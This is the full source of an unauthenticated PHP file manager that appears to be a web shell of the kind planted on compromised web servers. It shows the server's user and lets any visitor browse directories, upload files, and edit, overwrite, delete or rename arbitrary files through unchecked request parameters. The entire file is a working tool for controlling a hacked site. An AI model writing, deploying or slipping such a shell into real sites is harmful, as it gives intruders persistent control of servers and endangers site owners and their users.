<title><?= get_current_user() ?></title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style type="text/css">
@import url('https://fonts.googleapis.com/css2?family=Ubuntu:wght@500&display=swap');
table {
	font-family: 'Ubuntu', sans-serif;
    width: 70%;
    border-spacing:0;
	-webkit-box-shadow: 0px 2px 16px 3px rgba(18,18,18,0.32);
	-moz-box-shadow: 0px 2px 16px 3px rgba(18,18,18,0.32);
	box-shadow: 0px 2px 16px 3px rgba(18,18,18,0.32);
    border-radius:7px;
    color: #808080;
}

thead, tbody, tr, td, th { display: block; }

tr:after {
    content: ' ';
    display: block;
    visibility: hidden;
    clear: both;
}

thead th { 
    height: 30px;
    line-height: 30px;
}
a {
	text-decoration:none;
	color: #808080;
}
tbody {
    max-height:600px;
    overflow-y: auto;
}

thead {
    width: 97%;
    width: calc(100% - 17px);
}

tbody { border-top: 2px solid #e6e6e6; }

tbody td {
    width: 5em;
    float: left;
    /*border: 1px solid grey;*/
}
tbody td.td {
	padding:7px;
	width:65.52%;
}
tbody td {
	padding:7px;
}
tbody td.action {
	padding:15px;
	width:98.1%;
}
input[type=submit].rename, 
input[type=text].rename,
input[type=submit].edit,
textarea.edit {
	width:100%;
}
textarea.edit {
	color: #808080;
	font-family: 'Ubuntu', sans-serif;
	height:400px;
	border: 2px solid #e6e6e6;
	border-radius:7px;
	outline:none;
}
input[type=submit].edit {
	padding:7px;
	border: 2px solid #e6e6e6;
	border-radius:7px;
	outline:none;
	background: #fff;
	color: #808080;
}
input[type=submit].rename {
	padding:7px;
	border: 2px solid #e6e6e6;
	border-radius:7px;
	outline:none;
	background: #fff;
	color: #808080;
}
input[type=text].rename {
	padding:7px;
	border: 2px solid #e6e6e6;
	border-radius:7px;
	outline:none;
	background: #fff;
	color: #808080;
}
option {
	outline:none;
}
select.action:hover,
input[type=submit]:hover {
	border:2px solid red;
	cursor:pointer;
}
select.action {
	border: 2px solid #e6e6e6;
	color: #808080;
	border-radius:7px;
	padding:3px;
	outline:none;
	float:right;
}
select.act {
	padding: 5px;
	width:250px;
}
tbody td.action {
	padding:7px;
}
tbody tr.hover:hover {
	background:#e6e6e6;
}
tbody td:last-child, thead th:last-child {
    border-right: none;
} ::-webkit-scrollbar {
  	width: 0px;
} ::-webkit-scrollbar-track {
  	background: transparent; 
} ::-webkit-scrollbar-thumb {
  	background: transparent; 
} ::-webkit-scrollbar-thumb:hover {
  	background: transparent; 
}
.icon {
  max-width:25px;
  max-height:25px;
  margin-bottom:-5px;
  margin-right:7px;
}
.alert {
	width:98.5%;
	padding:7px;
	border-radius:7px;
}
.success {
	background: #79ed9a;
	color:#fff;
}
.failed {
	background: #ed7b79;
	color: #fff;
}
button {
	font-family: 'Ubuntu', sans-serif;
	font-weight:bold;
	font-size:17px;
	color: #808080;
	background:none;
	border:none;
	outline:none;
}
button:hover {
	cursor:pointer;
}
.submit-upload {
	margin-right:14px;
	width:85px;
	padding:1px;
	border-radius:7px;
	border: 2px solid #e6e6e6;
	color: #808080;
	background:#fff
}
@media screen and (max-width: 600px) {
	body {
		font-size:15px;
	}
	table {
		font-family: 'Ubuntu', sans-serif;
    	width: 100%;
    	font-size:13px;
    	border-spacing:0;
		-webkit-box-shadow: 0px 2px 16px 3px rgba(18,18,18,0.32);
		-moz-box-shadow: 0px 2px 16px 3px rgba(18,18,18,0.32);
		box-shadow: 0px 2px 16px 3px rgba(18,18,18,0.32);
    	border-radius:7px;
    	color: #808080;
	}
	tbody {
    	max-height:605px;
    	overflow-y: auto;
	}
	td.files {
		width:0em;
		display: none;
	}
	tbody td.action {
		width:95.6%;
	}
	tbody td.td {
		padding:7px;
		max-width:100%;
	}
	select.action {
		border: 2px solid #e6e6e6;
		color: #808080;
		background: #fff;
		border-radius:7px;
		padding:1px;
		outline:none;
		float:right;
	}
	select.act {
		padding: 5px;
	}
	tbody td.file {
		width:7em;
	}
	tbody td.dir {
		width:7em;
	}
	tbody td {
		padding:3px;
	}
	tbody td.screen {
		display: none;
	}
	select.fitur {
		width:100%;
	}
	.submit-upload {
		margin-right:-0.200px;
		width:85px;
		padding:1px;
		border-radius:7px;
		border: 2px solid #e6e6e6;
		color: #808080;
		background:#fff
	}
	.right {
		float: right;
	}
	.punten {
		width:96.5%;
	}

}
</style>
  <table align="center">
    <thead>
      <tr>
      	<form method="post">
        <th style="float:left;margin:10px;" colspan="4">
        	<button name="tools" value="home">HOME</button>&nbsp&nbsp&nbsp&nbsp
        	<button name="tools" value="upload">UPLOAD</button>
        </th>
    	</form>
      </tr>
    </thead>
    <tbody>
<?php
date_default_timezone_set('Asia/Jakarta');
function cwd() {
	if (isset($_GET['dir'])) {
		$cwd = $_GET['dir'];
		chdir($cwd);
	} else {
		$cwd = str_replace('\\', '/', getcwd());
	} return $cwd;
}
function perms($file) {
$perms = fileperms($file);

switch ($perms & 0xF000) {
    case 0xC000: // socket
        $info = 's';
        break;
    case 0xA000: // symbolic link
        $info = 'l';
        break;
    case 0x8000: // regular
        $info = 'r';
        break;
    case 0x6000: // block special
        $info = 'b';
        break;
    case 0x4000: // directory
        $info = 'd';
        break;
    case 0x2000: // character special
        $info = 'c';
        break;
    case 0x1000: // FIFO pipe
        $info = 'p';
        break;
    default: // unknown
        $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

return $info;
}
function permission($filename, $perms, $po=false) {
  if (is_writable($filename)) {
    ?> <font color="green"><?php print $perms ?></font> <?php
  } else {
    ?> <font color="red"><?php print $perms ?></font> <?php
  }
}
function alert($msg, $type) {
	?>
	<div class="alert punten <?=$type?>"><?= $msg ?></div>
	<?php
}
function size($file) {
    $bytes = filesize($file);

    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } elseif ($bytes > 1) {
        return $bytes . ' bytes';
    } elseif ($bytes == 1) {
        return '1 byte';
    } else {
        return '0 bytes';
    }
}
function delete($filename) {
  if (@is_dir($filename)) {
    $scandir = @scandir($filename);
    foreach ($scandir as $object) {
      if ($object != '.' && $object != '..') {
        if (@is_dir($filename.DIRECTORY_SEPARATOR.$object)) {
          @delete($filename.DIRECTORY_SEPARATOR.$object);
        } else {
          @unlink($filename.DIRECTORY_SEPARATOR.$object);
        }
      }
    } if (@rmdir($filename)) {
      return true;
    } else {
      return false;
    }
  } else {
    if (@unlink($filename)) {
      return true;
    } else {
      return false;
    }
  }
}
switch (@$_POST['tools']) {
	case 'home':
		?>
		<script type="text/javascript">window.location='http://<?=$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME']?>'</script>
		<?php
		break;
	case 'upload':
		?>
			<form method="post" enctype="multipart/form-data">
				<tr>
					<td class="action">
						<input type="file" name="file[]" multiple>
						<input class="submit-upload right" type="submit" name="submit" value="UPLOAD">
						<input type="hidden" name="tools" value="upload">
					</td>
				</tr>
			</form>
			<?php
			if (isset($_POST['submit'])) {
				$file = count($_FILES['file']['tmp_name']);
				for ($i=0; $i < $file ; $i++) { 
					if (copy($_FILES['file']['tmp_name'][$i] , cwd().'/'.$_FILES['file']['name'][$i])) {
						?>
						<tr>
							<td class="action">
								<?= alert($_FILES['file']['name'][$i]." uploaded", "success") ?>
							</td>
						</tr>
						<?php
					} else {
						?>
						<tr>
							<td class="action">
								<?= alert("permission danied","failed") ?>
							</td>
						</tr>
						<?php
					}
				}
			}
		break;
}
switch (@$_POST['action']) {
	case 'edit':
		if (isset($_POST['submit'])) {
			$handle = fopen($_POST['file'], "w");
			if (fwrite($handle, $_POST['text'])) {
				?>
				<tr>
					<td class="action">
						<?= alert("".basename($_POST['file'])." updated", 'success') ?>
					</td>
				</tr>
				<?php
			} else {
				?>
				<tr>
					<td class="action">
						<?= alert("permission danied", 'failed') ?>
					</td>
				</tr>
				<?php
			}
		}
		?>
			<tr>
				<td class="action">
					Filename : <?= permission($_POST['file'], basename($_POST['file'])) ?>&nbsp&nbsp
				</td>
				<td class="action">
					Size : <?= size($_POST['file']) ?>
				</td>
				<td class="action">
					Last Update : <?= date("F d Y g:i:s", filemtime($_POST['file'])); ?>
				</td>
				<form method="post">
				<td class="action">
					<select class="action act fitur" style="float:left;" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
						<option value="back">back</option>
						<option value="edit" selected>Edit</option>
						<option value="delete">delete</option>
						<option value="rename">rename</option>
					</select>
					<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
				</td>
			</tr>
			</form>
			<form method="post">
			<tr>
				<td class="action">
					<textarea class="edit" name="text"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
				</td>
			</tr>
			<tr>
				<td class="action">
					<input class="edit" type="submit" name="submit" value="EDIT">
					<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
					<input type="hidden" name="action" value="edit">
				</td>
			</tr>
		</form>
		<?php
		exit();
		break;
	case 'delete':
		delete($_POST['file']);
		break;
	case 'rename':
		if (isset($_POST['submit'])) {
			if (rename($_POST['file'], $_POST['newname'])) {
				?> <script>window.location='?dir=<?=cwd()?>'</script> <?php
			} else {
				?>
				<tr>
					<td class="action">
						<?= alert("permission danied", 'failed') ?>
					</td>
				</tr>
				<?php
			}
		}
		switch ($_POST['file']) {
			case @filetype($_POST['file']) == 'dir':
				if (is_dir($_POST['file'])) {
					?>
					<tr>
						<td class="action">
							Filename : <?= permission($_POST['file'], basename($_POST['file'])) ?>&nbsp&nbsp
						</td>
						<td class="action">
							Size : <?= size($_POST['file']) ?>
						</td>
						<td class="action">
							Last Update : <?= date("F d Y g:i:s", filemtime($_POST['file'])); ?>
						</td>
						<form method="post">
						<td class="action">
							<select class="action act fitur" style="float:left;" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
									<option value="back">back</option>
									<option value="delete">delete</option>
									<option value="rename" selected>rename</option>
							</select>
							<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
						</td>
					</tr>
					</form>
					<form method="post">
					<tr>
						<td class="action">
							<input class="rename" type="text" name="newname" value="<?= basename($_POST['file']) ?>">
						</td>
					</tr>
					<tr>
						<td class="action">
							<input class="rename" type="submit" name="submit" value="RENAME">
							<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
							<input type="hidden" name="action" value="rename">
						</td>
					</tr>
				</form>
				<?php
				}
				break;
			
			case @filetype($_POST['file']) == 'file':
				if (is_file($_POST['file'])) {
					?>
					<tr>
						<td class="action">
							Filename : <?= permission($_POST['file'], basename($_POST['file'])) ?>&nbsp&nbsp
						</td>
						<td class="action">
							Size : <?= size($_POST['file']) ?>
						</td>
						<td class="action">
							Last Update : <?= date("F d Y g:i:s", filemtime($_POST['file'])); ?>
						</td>
						<form method="post">
						<td class="action">
							<select class="action act fitur" style="float:left;" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
								<option value="back">back</option>
								<option value="edit">edit</option>
								<option value="delete">delete</option>
								<option value="rename" selected>rename</option>
							</select>
								<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
						</td>
					</tr>
					</form>
					<form method="post">
					<tr>
						<td class="action">
							<input class="rename" type="text" name="newname" value="<?= basename($_POST['file']) ?>">
						</td>
					</tr>
					<tr>
						<td class="action">
							<input class="rename" type="submit" name="submit" value="RENAME">
							<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
							<input type="hidden" name="action" value="rename">
						</td>
					</tr>
				</form>
				<?php
				}
				break;
			}
		exit();
		break;
	case 'back':
		@header("Location: ?dir=".cwd()."");
		break;
}
if(function_exists('opendir')) {
	if($opendir = opendir(cwd())) {
		while(($readdir = readdir($opendir)) !== false) {
			$getpath[] = $readdir;
		} closedir($opendir);
	} sort($getpath);
} else {
	$getpath = scandir(cwd());
}
foreach ($getpath as $dir) {
	if (!is_dir($dir) || $dir === '.') continue;
		if ($dir === '..') {
			$back = "<input type='checkbox'>&nbsp&nbsp<a href='?dir=".dirname(cwd())."'>
					 <img class='icon' src='https://image.flaticon.com/icons/svg/833/833385.svg' title='back'>
					 </a>";
		} else {
			$back = "<input type='checkbox'>&nbsp&nbsp<img src='https://image.flaticon.com/icons/svg/716/716784.svg' class='icon' title='{$dir}'>&nbsp&nbsp<a href='?dir=".cwd().'/'.$dir."'>{$dir}</a>";
		} if ($dir === '.' || $dir === '..') {
			$action = "<td class='dir'></td>";
		} else {
			$action = '<form method="post">
							<td class="dir">
								<select class="action" style="float:right;" name="action" onchange="if(this.value != 0) { this.form.submit(); }"">
									<option selected>choose . .</option>
									<option value="delete">delete</option>
									<option value="rename">rename</option>
								</select>
								<input type="hidden" name="file" value="'.cwd().'/'.$dir.'">
							</td>
					  </form>';
		}
		?>
		<tr class="hover">
			<td class="td">
				<?= $back ?>
			</td>
			<td class="screen"><center>--</center></td>
			<td class="files">
				<center>
					<span style="font-size:15px;float:right;">
						<?= permission($dir, perms($dir)) ?>
					</span>	
				</center>
			</td>
			<form method="post">
			<?= $action ?>
		</tr>
		<?php
}
foreach ($getpath as $file) {
	if (is_file($file)) {
		?>
		<tr class="hover">
			<td class="td">
				<input type='checkbox'>
				<?php
				print("<img class='icon' src='");
				$ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
				switch ($ext) {
					case 'php':
						print("https://image.flaticon.com/icons/png/128/337/337947.png");
						break;
					case 'pl':
						print("https://image.flaticon.com/icons/svg/186/186645.svg");
						break;
					case 'xml':
						print("https://image.flaticon.com/icons/svg/136/136526.svg");
						break;
					case 'json':
						print("https://image.flaticon.com/icons/svg/136/136525.svg");
						break;
					case 'exe':
						print("https://image.flaticon.com/icons/svg/136/136531.svg");
						break;
					case 'png':
						print("http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename($file))."");
						break;
					case 'html':
						print("https://image.flaticon.com/icons/png/128/136/136528.png");
						break;
					case 'css':
						print("https://image.flaticon.com/icons/png/128/136/136527.png");
						break;
					case 'ico':
						print("https://image.flaticon.com/icons/png/128/1126/1126873.png");
						break;
					case 'jpg':
						print("http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename($file))."");
						break;
					case 'jpeg':
						print("http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename($file))."");
						break;
					case 'gif':
						print("http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename($file))."");
						break;
					case 'pdf':
						print("https://image.flaticon.com/icons/png/128/136/136522.png");
						break;
					case 'mp4':
						print("https://image.flaticon.com/icons/png/128/136/136545.png");
						break;
					case 'py':
						print("https://image.flaticon.com/icons/png/128/180/180867.png");
						break;
					case 'c':
						print("https://image.flaticon.com/icons/svg/2306/2306037.svg");
						break;
					case 'bmp':
						print("https://image.flaticon.com/icons/svg/337/337925.svg");
						break;
					case 'cpp':
						print("https://image.flaticon.com/icons/svg/2306/2306030.svg");
						break;
					case 'txt':
						print("https://image.flaticon.com/icons/png/128/136/136538.png");
						break;
					case 'zip':
						print("https://image.flaticon.com/icons/png/128/136/136544.png");
						break;
					case 'js':
						print("https://image.flaticon.com/icons/png/128/1126/1126856.png");
						break;
					case 'dll':
						print("https://image.flaticon.com/icons/svg/2306/2306057.svg");
						break;
					default:
						print("https://image.flaticon.com/icons/svg/833/833524.svg");
				 		break;
				}
				 	print("' title='{$file}'>");
				$href = "http://".$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd().'/'.basename($file));
				?>
				 <a href="<?= $href ?>" target='_blank'><?= $file ?></a>
			</td>
			<td class="screen">
				<center>
					<span style="font-size:15px;"><?= size($file) ?></span>
				</center>
			</td>
			<div>
			<td class="files">
				<center>
					<span style="font-size:15px;">
						<?= permission($file, perms($file)) ?>
					</span>
				</center>
			</td>
			<form method="post">
			<td class="file">
				<select class="action" style="float:right;" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
					<option selected>choose . .</option>
					<option value="edit">Edit</option>
					<option value="delete">delete</option>
					<option value="rename">rename</option>
				</select>
				<input type="hidden" name="file" value="<?= cwd().'/'.$file ?>">
			</td>
			</form>
		</tr>
		<?php
	}
}
?>
<tr>
	<td class="action">
		<select class="action" style="float:left;width:50%;" onchange='if(this.value != 0) { this.form.submit(); }'>
			<option selected="">choose . .</option>
		</select>
	</td>
</tr>
<?php
?>
</tbody>
</table>
